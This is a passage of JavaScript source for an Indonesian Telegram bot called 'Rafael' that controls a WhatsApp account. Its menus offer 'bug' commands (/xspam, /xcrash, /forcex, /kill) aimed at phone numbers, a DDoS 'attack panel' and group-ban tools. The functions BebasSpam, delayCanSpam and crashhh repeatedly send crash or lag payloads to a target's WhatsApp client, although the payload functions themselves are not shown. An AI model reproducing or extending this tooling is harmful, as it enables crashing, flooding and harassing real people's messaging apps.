⠀⠀⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
`));
console.log(chalk.cyan(`
╔─═⊱ Information:
☇ Creator : @bronsew
☇ Name Script : Rafael
☇ Version : infinity 
┗━━━━━━━━━━━━━━━━━━━━━━⬡
`));
  console.log(chalk.blue(" RAFAEL IS HERE...!"));
  console.log(chalk.magenta("🔐 ALL LOCK."));
};

validateToken();

async function checkExpired() {

    const EXPIRED = new Date("3010-05-15T07:25:00Z").getTime()

    try {

        // ambil waktu server dari header
        const res = await axios.get("https://google.com")
        const now = new Date(res.headers.date).getTime()

        const diff = EXPIRED - now

        if (diff <= 0) {
            console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @bronsew")
            process.exit(0);
        }

        const hari = Math.floor(diff / 86400000)
        const jam = Math.floor((diff % 86400000) / 3600000)

        console.log(`✅ SCRIPT AKTIF | WAKTU TERSISA | ${hari} HARI ${jam} JAM LAGI`)

    } catch {
        console.log("⚠️ Gagal cek waktu internet")
    }

}

checkExpired();

// WhatsApp Connection
const store = {
    messages: {},
    contacts: {},
    chats: {},
    bind(ev) {
        ev.on('messages.upsert', ({ messages }) => {
            for (const msg of messages) {
                if (!msg.key?.remoteJid) continue;
                const jid = msg.key.remoteJid;
                if (!store.messages[jid]) store.messages[jid] = [];
                store.messages[jid].push(msg);
                // batasi memori biar tidak bocor
                if (store.messages[jid].length > 200) store.messages[jid].shift();
            }
        });
        ev.on('contacts.upsert', (contacts) => {
            for (const c of contacts) store.contacts[c.id] = c;
        });
        ev.on('chats.upsert', (chats) => {
            for (const c of chats) store.chats[c.id] = c;
        });
    },
    loadMessage(jid, id) {
        return (store.messages[jid] || []).find(m => m.key.id === id);
    },
};
// [KOMPONEN 5] CLEANUP SESSION — Perbaikan hapus folder
async function cleanupSessionAndRestart() {
  isWhatsAppConnected = false;
  isReconnecting = false;

  try { sock?.ev?.removeAllListeners?.(); } catch {}
  try { sock?.ws?.close?.(); } catch {}
  try { sock?.end?.(undefined); } catch {}
  sock = null;

  // Tunggu socket benar-benar tertutup sebelum hapus file
  await new Promise(r => setTimeout(r, 2000));

  const sessionDir = path.resolve('./session');
  for (let i = 0; i < 5; i++) {
    try {
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
      if (!fs.existsSync(sessionDir)) {
        console.log(chalk.green.bold('[✓] Folder session berhasil dihapus.'));
        console.log(chalk.cyan.bold('[i] Memulai ulang bot dalam 5 detik untuk pairing baru...'));
        setTimeout(() => {
          startSesi().catch(err =>
            console.log(chalk.red(`[RESTART] Gagal start ulang: ${err.message}`))
          );
        }, 5000);
        return;
      }
    } catch (err) {
      console.log(chalk.yellow(`[CLEANUP] Percobaan ${i + 1} gagal: ${err.message}`));
    }
    await new Promise(r => setTimeout(r, 1000));
  }
  console.log(chalk.red.bold('[✗] Gagal hapus folder session. Hapus manual di:'));
  console.log(chalk.yellow(`    ${sessionDir}`));
}

// [KOMPONEN 6] START SESI — Versi perbaikan (401 conflict TIDAK hapus sesi)
const startSesi = async () => {
  // ✅ 1. Cleanup socket lama sebelum bikin baru
  if (sock) {
    try { sock.ev.removeAllListeners(); } catch {}
    try { sock.ws?.close(); } catch {}
    try { sock.end?.(undefined); } catch {}
    sock = null;
  }

  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: Browsers.macOS('Safari'),
    syncFullHistory: false,
    markOnlineOnConnect: false,
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  // Update lastActivity setiap ada pesan masuk (untuk watchdog)
  sock.ev.on('messages.upsert', () => { lastActivity = Date.now(); });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    // ===================== OPEN =====================
    if (connection === 'open') {
  isReconnecting = false;
  isWhatsAppConnected = true;
  lastActivity = Date.now();

  console.log(chalk.green.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
}

    // ===================== CLOSE =====================
    if (connection === 'close') {
      isWhatsAppConnected = false;

      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const reason = lastDisconnect?.error?.message || 'unknown';
      const reasonLower = String(reason).toLowerCase();

      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯
  Status : ${statusCode ?? '-'}
  Reason : ${reason}
`));

      // ============================================================
      const isConflict =
        reasonLower.includes('conflict') ||
        reasonLower.includes('replaced') ||
        reasonLower.includes('stream errored');

      const isRealLogout =
        statusCode === DisconnectReason.loggedOut && !isConflict;

      const isSessionBad =
        statusCode === 500 ||   // badSession
        statusCode === 411;     // multideviceMismatch

      const isForbidden = statusCode === 403;

      if (isRealLogout || isSessionBad || isForbidden) {
        console.log(chalk.red.bold(
          '[!] Sesi benar-benar mati / logout. Menghapus folder session...'
        ));
        await cleanupSessionAndRestart();
        return;
      }

      // ✅ RECONNECT BIASA — tanpa hapus sesi (untuk conflict / timeout)
      if (isReconnecting) return;
      isReconnecting = true;

      // Cleanup socket lama
      try { sock?.ev?.removeAllListeners?.(); } catch {}
      try { sock?.ws?.close?.(); } catch {}
      try { sock?.end?.(undefined); } catch {}
      sock = null;

      const delayMs = 5000;
      console.log(chalk.yellow.bold(`
╭─────────────────────────────╮
│ ${chalk.white(`Menyambung kembali dalam ${delayMs / 1000}s...`)}
╰─────────────────────────────╯`));

      setTimeout(async () => {
        try {
          await startSesi();
        } catch (err) {
          console.log(chalk.red(`[RECONNECT] Gagal start sesi: ${err.message}`));
          isReconnecting = false;
        }
      }, delayMs);
    }
  });
};
// ✅ Middleware cek koneksi WhatsApp (dengan queue guard)

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected || !sock || !sock.user) {
    ctx.reply(`❌ WhatsApp Belum terhubung`);
    return;
  }
  // Kalau antrian terlalu panjang, minta user tunggu
  if (typeof sendQueue !== 'undefined' && sendQueue.length > 30) {
    ctx.reply(`⏳ Server sedang sibuk (${sendQueue.length} antrian). Coba lagi nanti.`);
    return;
  }
  next();
};
//=================================//
async function BebasSpam(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 1000;      
  const totalLoops = 5;
  const startTime = Date.now();

  console.log(`[Task ${taskId}] Mulai spam ke ${target}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      await GrenXx(sock, target);
      
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`[${i}/${totalLoops}] Terkirim (${duration}s)`);
    } catch (err) {
      console.error(`[${i}/${totalLoops}] Gagal:`, err.message);
    }
    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai dalam ${totalTime}s`);
}

async function delayCanSpam(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 2000;   
  const lopers = 15;    
  const startTime = Date.now();

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();

    try {
      await delayhard(sock, target);
      await makluInvis(sock, target);
      await mbutnew(sock, target);
      await iosdelay(sock, target);
      await xovaliaum(sock, target);
      
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} (${duration}s)`);   // ✅ pakai lopers

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug Gagal: ${i}/${lopers} — ${err.message}`);  // ✅ (opsional)
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));  // ✅ pakai lopers
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai dalam ${totalTime}s`);  // ✅ (opsional tambah log)
}

async function crashhh(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 2000;   
  const lopers = 25;    
  const startTime = Date.now();

  for (let i = 1; i <= lopers; i++) {
    const loopStart = Date.now();

    try {
      await delayhard(sock, target);
      await makluInvis(sock, target);
      await xovaliaum(sock, target);
      
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug: ${i}/${lopers} (${duration}s)`);   // ✅ pakai lopers

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`Send Bug Gagal: ${i}/${lopers} — ${err.message}`);  // ✅ (opsional)
    }
    if (i < lopers) await new Promise(r => setTimeout(r, delay));  // ✅ pakai lopers
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai dalam ${totalTime}s`);  // ✅ (opsional tambah log)
}
////=========PRIVATE CHAT GUARD + AUTO MUTE LOG========\\\\
// Helper: format tanggal & waktu lengkap
function formatDateTime(date) {
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const d = new Date(date);
  const namaHari = hari[d.getDay()];
  const tanggal = d.getDate();
  const namaBulan = bulan[d.getMonth()];
  const tahun = d.getFullYear();
  const jam = String(d.getHours()).padStart(2, '0');
  const menit = String(d.getMinutes()).padStart(2, '0');
  const detik = String(d.getSeconds()).padStart(2, '0');
  return `${namaHari}, ${tanggal} ${namaBulan} ${tahun} — ${jam}:${menit}:${detik}`;
}

function getRealTime() {
  const now = new Date();
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const Hari = hari[now.getDay()];
  const tanggalnew = now.getDate();
  const Bulan = bulan[now.getMonth()];
  const tahunnew = now.getFullYear();
  return `${Hari}, ${tanggalnew} ${Bulan} ${tahunnew}`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

// Middleware: deteksi private chat & auto mute
let autoMuteEnabled = true;

// Durasi mute dalam ms (2 menit)
const MUTE_DURATION_MS = 2 * 60 * 1000;

// Map menyimpan userId → timestamp kapan mute berakhir
const mutedUsers = new Map();
// ── Command: /privatemute on|off  (OWNER ONLY) ─────────────
bot.command('privatemute', async (ctx) => {
  const userId = ctx.from.id.toString();

  // Hanya owner yang bisa pakai command ini
 if (!isOwner(userId)) {
  return ctx.reply('⛔ Kamu tidak memiliki izin untuk menggunakan command ini.');
}

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();

  if (arg === 'on') {
    autoMuteEnabled = true;
    return ctx.reply(
      `✅ *Auto-Mute Private Chat* telah *diaktifkan!*\n` +
      `Setiap user yang DM bot akan otomatis di-mute 2 menit.`,
      { parse_mode: 'Markdown' }
    );
    } else if (arg === 'off') {
    autoMuteEnabled = false;
    mutedUsers.clear(); // <── Tambahkan ini agar semua daftar mute langsung dihapus bersih!
    return ctx.reply(
      `🔕 *Auto-Mute Private Chat* telah *dinonaktifkan!*\n` +
      `Semua user telah dibebaskan dan bebas DM bot.`,
      { parse_mode: 'Markdown' }
    );

  } else {
    const status = autoMuteEnabled ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Auto-Mute Private Chat: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/privatemute on\` — aktifkan\n` +
      `• \`/privatemute off\` — nonaktifkan`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ── Middleware: Deteksi private chat & auto mute ───────────
bot.use(async (ctx, next) => {
  // Hanya tangkap pesan di private chat
  if (ctx.chat?.type !== 'private') return next();

  // Jangan proses command /start & /privatemute
  const text = ctx.message?.text || '';
  if (text.startsWith('/start') || text.startsWith('/privatemute')) return next();

  const user = ctx.from;
  const userId = user.id.toString();
  const username = user.username ? `@${user.username}` : `#${userId}`;
  const fullName = `${user.first_name || ''}${user.last_name ? ' ' + user.last_name : ''}`.trim();

  // ── OWNER BYPASS: owner tidak pernah kena mute ──────────
  if (userId === OWNER_ID.toString()) {
    return next();
  }

  // 🔥 [PERBAIKAN] Cek fitur aktif/mati ditaruh di sini!
  // Jika fitur MATI, langsung loloskan tanpa cek status mute yang tersisa
  if (!autoMuteEnabled) {
    return next();
  }

  // ── Cek apakah user masih dalam status mute ─────────────
  if (mutedUsers.has(userId)) {
    const unmuteTime = mutedUsers.get(userId);
    if (Date.now() < unmuteTime) {
      const sisaMs = unmuteTime - Date.now();
      const sisaMenit = Math.floor(sisaMs / 60000);
      const sisaDetik = Math.floor((sisaMs % 60000) / 1000);
      await ctx.reply(
        `⚠️ Kamu masih dalam status *mute*.\n` +
        `⏳ Sisa waktu: *${sisaMenit} menit ${sisaDetik} detik*`,
        { parse_mode: 'Markdown' }
      );
      return; // stop
    } else {
      // Waktu mute sudah habis, hapus dari map
      mutedUsers.delete(userId);
    }
  }

  // ── User kirim pesan di private → langsung mute ─────────
  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + MUTE_DURATION_MS);
  mutedUsers.set(userId, muteEnd.getTime());

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓\n` +
    `   >> PRIVATE CHAT DETECTED — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER     : ${username}\n` +
    `│ ◈ NAMA     : ${fullName}\n` +
    `│ ◈ USER ID  : ${userId}\n` +
    `│ ◈ MUTE    : 2 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  // Kirim log ke GROUP
  // Kirim log ke GROUP
if (LOG_GROUP_ID) {
  try {
    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://files.catbox.moe/hd29if.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log ke group:', e.message);
  }
}

  // Kirim log ke OWNER
  try {
  await ctx.telegram.sendPhoto(OWNER_ID, 'https://files.catbox.moe/hd29if.jpg', {
    caption: logMessage,
    parse_mode: 'Markdown'
  });
} catch (e) {
  console.error('Gagal kirim log ke owner:', e.message);
}

  // Balas ke user yang kena mute
  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption:
      `🚫 Kamu telah di-*mute* selama *2 menit* karena mengirim pesan ke private bot.\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return; // stop
});

////=========MENU UTAMA========\\\\

async function isUserJoined(ctx, userId) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, userId);
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch (e) {
    return false;
  }
}

// Handler tombol "Sudah Join"
bot.action('check_join', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const sudahJoin = await isUserJoined(ctx, userId);

  if (!sudahJoin) {
    await ctx.answerCbQuery('❌ Kamu belum join channel!', { show_alert: true });
    return;
  }

  await ctx.deleteMessage();

  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";

  const mainMenuMessage = `\`\`\`javascript
( 🪼 ) R A F A E L ─═⊱
/*
Привет Рафаэль готов помочь
Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.*/
──────────────────────────
-# Metadata Intelligence
creator : "@bronsew";
Script  : "Rafael";
Version: " infinity ";
User   : "${Name}";
Date   : "${waktu}"
Status : "${waStatus}"
\`\`\``;

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          {
        text: "𝐒𝐄𝐓𝐓𝐈𝐍𝐆 𝐌𝐄𝐍𝐔",
        callback_data: "owner_menu",
        style: 'success',
      },
     ],
     [
      {
        text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
        callback_data: "bug_menu",
        style: 'primary',
      }
    ],
    [
    {
        text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔",
        callback_data: "tools_menu",
        style: 'danger',
      }
       ],
      [
        ],
      ],
    },
  });
});


////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";

  const sudahJoin = await isUserJoined(ctx, userId);

  if (!sudahJoin) {
    const forceMsg = `\`\`\`javascript
╭───〔 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 〕───╮
│ ◈ USER   : ${Name}
│ ◈ STATUS : ❌ Belum Join
│
│  Silakan JOIN channel kami
│  terlebih dahulu sebelum
│  menggunakan bot ini!
╰──────────────────────╯
\`\`\``;

    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: forceMsg,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text:`「 📢 」 JOIN ${CHANNEL_USERNAME}`, url: `https://t.me/${CHANNEL_USERNAME.replace('@', '')}`, style: 'danger' }],
          [{ text: '「 ✅ 」 Verifikasi', callback_data: 'check_join', style: 'success' }],
        ],
      },
    });
  }

  // Sudah join → menu utama
  const mainMenuMessage = `\`\`\`javascript
( 🪼 ) R A F A E L ─═⊱
/*
Привет Рафаэль готов помочь
Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.*/
──────────────────────────
-# Metadata Intelligence
creator : "@bronsew";
Script  : "Rafael";
Version: " infinity ";
User   : "${Name}";
Date   : "${waktu}"
Status : "${waStatus}"
NOTE :JIKA BOT TIDAK MERESPON /restart ULANG!!! 
SC UPDATE OTOMATIS /update
\`\`\``;

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          {
        text: "𝐒𝐄𝐓𝐓𝐈𝐍𝐆 𝐌𝐄𝐍𝐔",
        callback_data: "owner_menu",
        style: 'success',
      },
     ],
     [
      {
        text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
        callback_data: "bug_menu",
        style: 'primary',
      }
    ],
    [
    {
        text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔",
        callback_data: "tools_menu",
        style: 'danger',
     }
         ],
      [
        ],
      ],
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /addsender 62xxx
┃❏ /delsesi
┃❏ /addpremgroup <add all member>
┃❏ /delpremgroup <delete acces all memb>
┃❏ /addpremgroupid <ɪᴅ>
┃❏ /delpremgroupid
┃❏ /cekpremgroup
┃❏ /listpremgroup
┃❏ /blockcmd  <Block command bug>
┃❏ /unblockcmd <Unblock command bug>
┃❏ /listblockcmd <list command>
┃❏ /addadmin <ɪᴅ>
┃❏ /deladmin <ɪᴅ>
┃❏ /addprem <ɪᴅ>
┃❏ /delprem <ɪᴅ>
┃❏ /cekprem <ᴄᴇᴋ>
┃❏ /setcd 
┃❏ /addpromo 
┃❏ /delpromo
┃❏ /antipromo on/off
┃❏ /listpromo 
┃❏ /privatemute on/off
╰━───────────────━❏\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});


bot.action("tools_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /brat <Brat to sticker>
┃❏ /tiktokdl <TikTok downloader>
┃❏ /iqc <iPhone camera effect.>
┃❏ /info <cekid.>
┃❏ /kalkulator <Kalkulator tools>
┃❏ /bandgb <Band group WhatsApp.>
┃❏ /ddos <Attack panel.>
┃❏ /approved <-100xxxxxxxxxx.>
┃❏ /unapproved <-100xxxxxxxxxx.>
┃❏ /version <versi terbaru sc>
┃❏ /update <update versi terbaru>
┃❏ /restart <restart panel>
┃❏ /rest on/off <mode istirahat>
╰━─────────────────━❏
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: 'Primary' }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
━━━【 𝐇𝐢𝐠𝐡 𝐒𝐩𝐚𝐦 】━━━
┃╰┈➤ /xspam 62xx 
┃   delay invis + lag
┃╰┈➤ /xcrash 62xx
┃   delay invis + lag
┃╰┈➤ /forcex 62xx
╰━━━━━━━━━━━━━━━༉‧.
━━━【𝗣𝗲𝗻𝘁𝗶𝗻𝗴!!】━━━
𝗡𝗯 : 𝘐𝘯𝘷𝘪𝘴𝘪𝘣𝘭𝘦 : 𝘛𝘪𝘥𝘢𝘬 𝘛𝘦𝘳𝘭𝘪𝘩𝘢𝘵
aman spam 
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" },
        { text: "➡️ ", callback_data: "bug_menu2", style: "success" }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});

bot.action("bug_menu2", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━━━〔 NO SPAM BUG 〕━━━╮
│ /kill ➜ 628xxxx
│ /out ➜ 628xxxx
╰━━━━━━━━━━━━━━━━━━━━━\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  // ✅ Tombol ➡️ ke bug_gb sudah dihapus
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔙 𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂 ", callback_data: "back", style: "primary" }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard 
    });
  }
});


// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "✔️" : "❌ ";
      
  const mainMenuMessage = `\`\`\`javascript
( 🪼 ) R A F A E L ─═⊱
/*
Привет Рафаэль готов помочь
Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.*/
──────────────────────────
-# Metadata Intelligence
creator : "@bronsew";
Script  : "Rafael";
Version: " infinity ";
User   : "${Name}";
Date   : "${waktu}"
Status : "${waStatus}"
NOTE :JIKA BOT TIDAK MERESPON /restart ULANG!!! 
SC UPDATE OTOMATIS /update
\`\`\``;

 const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const mainKeyboard = [
    [
      {
        text: "𝐒𝐄𝐓𝐓𝐈𝐍𝐆 𝐌𝐄𝐍𝐔",
        callback_data: "owner_menu",
        style: 'success',
      },
     ],
     [
      {
        text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔",
        callback_data: "bug_menu",
        style: 'primary',
      }
    ],
    [
    {
        text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔",
        callback_data: "tools_menu",
        style: 'danger',
      }
    ],
  ];
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
// ===== UPDATE =====
async function updateMulti(ctx) {
  await ctx.telegram.editMessageReplyMarkup(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  );
}
//////// -- CASE TOOLS --- \\\\\\\\\\\
